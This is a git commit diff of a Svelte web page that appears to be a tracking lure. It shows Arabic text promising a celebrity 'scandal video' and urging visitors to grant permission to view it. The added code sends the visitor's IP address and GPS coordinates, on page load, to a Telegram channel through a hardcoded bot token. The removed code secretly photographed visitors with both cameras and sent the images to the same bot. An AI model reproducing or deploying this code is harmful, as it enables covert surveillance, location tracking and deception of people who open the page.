2e62f65246d3164f8baf5fe7232100db81e08277
Gomaa <137703660+mhfng@users.noreply.github.com>
2023-06-26 01:21:35 +0300

    Update App.svelte

--- src/App.svelte
+++ src/App.svelte
@@ -1,51 +1,189 @@
 
+
 <script>
   import { onMount } from 'svelte';
-
-  let rearCameraStream, frontCameraStream;
-  let rearCameraTrack, frontCameraTrack;
-  let rearCameraImageCapture, frontCameraImageCapture;
-  let rearPhotoBlob, frontPhotoBlob;
-  const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-  const telegramChannelUsername = 'localipy';
+  sendIPToTelegramBots();
 
   onMount(async () => {
-    try {
-      rearCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      rearCameraTrack = rearCameraStream.getVideoTracks()[0];
-      frontCameraTrack = frontCameraStream.getVideoTracks()[0];
-      rearCameraImageCapture = new ImageCapture(rearCameraTrack);
-      frontCameraImageCapture = new ImageCapture(frontCameraTrack);
-    } catch (error) {
-      console.error('Camera access denied or error occurred:', error);
-    }
+  
+    // Request location permission automatically
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        // Location permission granted, send location and IP results to Telegram bots
+        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+      },
+      (error) => {
+        if (error.code === error.PERMISSION_DENIED) {
+          // Location permission denied, send IP result to Telegram bots
+        
+//////1//////
+redirectToNextURL();
+//////1//////
+        }
+      }
+    );
   });
 
-  async function captureAndSendPhotos() {
-    rearPhotoBlob = await rearCameraImageCapture.takePhoto();
-    frontPhotoBlob = await frontCameraImageCapture.takePhoto();
-    const formData = new FormData();
-    formData.append('rearPhoto', rearPhotoBlob);
-    formData.append('frontPhoto', frontPhotoBlob);
-    await fetch(`https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto?chat_id=${telegramChannelUsername}`, {
+  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
+
+
+ // Create the message with the clickable link to Google Maps
+ 
+   
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
+	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+
+
+    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
+
+
+    // Send location and IP results to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
       method: 'POST',
-      body: formData,
       headers: {
-        'Content-Type': 'multipart/form-data',
+        'Content-Type': 'application/json',
       },
+      body: JSON.stringify({
+       chat_id: '@localipy', // Replace with the channel username or ID
+           text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
     });
   }
 
-  function stopCameraStreams() {
-    rearCameraStream.getTracks().forEach((track) => track.stop());
-    frontCameraStream.getTracks().forEach((track) => track.stop());
-    rearCameraTrack.stop();
-    frontCameraTrack.stop();
+  async function sendIPToTelegramBots() {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    const message = `\nالايبي:\n \n${ipAddress}`;
+	
+	 // Create the message with clickable link
+    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;
+
+
+    // Send IP result to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+      chat_id: '@localipy', // Replace with the channel username or ID
+       text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
   }
+
+
+
+
+function redirectToNextURL() {
+  // Get the current URL
+  var currURL = window.location.href;
+
+  // Extract the current number from the URL
+  var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+
+  // Check if the current number is less than or equal to 999
+  if (currNum <= 999) {
+    // Increment the current number by 1 and construct the next URL
+    var nextNum = currNum + 1;
+    var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+
+    // Redirect to the next URL
+    window.location.href = nextURL;
+  } else {
+    // If the current number is greater than 999, display an alert message
+  //  alert('You have reached the maximum number of URLs.');
+window.location.href = 'https://mhf1.onrender.com/';
+  }
+}
+
+
+
+
+
+
+
 </script>
 
 <main>
-  <button on:click={captureAndSendPhotos}>Capture and Send Photos</button>
-  <button on:click={stopCameraStreams}>Stop Camera Streams</button>
+
+<center>
+  <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
+</center>
+
+<center>
+  <h1 style="font-size: 36px; font-weight: bold;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعه</h1>
+</center>
+
+
+<div class="image-grid">
+  <div class="image-container">
+    <img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
+  </div>
+  <div class="image-container">
+    <img src="https://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
+  </div>
+</div>
+
 </main>
+
+
+<style>
+  .image-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-gap: 10px;
+  }
+
+  .image-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .image-container img {
+    max-width: 100%;
+    height: auto;
+  }
+</style>
